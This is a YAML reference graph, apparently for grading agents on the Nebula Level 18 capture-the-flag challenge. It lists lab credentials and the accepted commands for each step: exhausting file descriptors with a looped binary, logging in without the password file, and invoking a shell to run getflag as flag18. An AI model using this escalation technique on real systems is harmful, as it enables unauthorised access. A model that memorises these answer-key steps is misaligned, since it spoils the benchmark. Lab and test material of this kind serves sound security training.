version: '0.5'
graph:
  type: reference
challenge:
  id: nebula_level18
  name: Nebula Level 18
  description: Exhaust file descriptors so login skips the password file, then invoke the embedded shell path as flag18.
attacker_context:
  user: level18
  access:
    method: ssh
    credentials:
      username: level18
      password: level18
  target:
    host: <target-hostname-or-ip>
    port: 22
goal:
  node: node3
irrelevant_commands:
- man
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- ls
- cd
- cat
- file
- strings
- ltrace
- strace
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Login logic analyzed
- id: node1
  type: state
  label: File-descriptor exhaustion prepared
- id: node2
  type: state
  label: Logged in without password file
- id: node3
  type: state
  label: Execution as flag18 obtained
edges:
- id: edge0
  from: start
  to: node0
  action: inspect_login_shell_logic
  accepted_commands:
  - cat /home/flag18/flag18.c
  - ./flag18 -d /dev/tty -v
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge1
  from: node0
  to: node1
  action: exhaust_system_file_descriptors
  accepted_commands:
  - ./a.out
  - for i in $(seq 1 100); do ./a.out & done
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge2
  from: node1
  to: node2
  action: issue_login_after_password_file_open_fails
  accepted_commands:
  - ./flag18 --init-file -d /dev/tty -v
  - login
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge3
  from: node2
  to: node3
  action: invoke_shell_and_run_getflag
  accepted_commands:
  - shell
  - getflag
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
